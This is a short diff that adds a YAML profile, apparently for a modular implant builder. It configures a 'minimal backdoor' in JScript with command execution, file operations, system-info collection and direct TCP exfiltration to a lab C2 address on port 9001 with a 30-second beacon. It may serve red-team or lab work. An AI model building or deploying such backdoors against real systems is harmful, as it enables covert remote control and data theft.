@@ -1,0 +1,15 @@
+name: cs_jscript_tcp_direct_v1
+description: "Minimal backdoor \u2014 sysinfo only, fast beacon, no evasion"
+format: jscript
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- collectors/sysinfo
+arch: arch/backdoor
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
+  BEACON_INTERVAL: '30000'
+exfil: exfil/tcp_direct
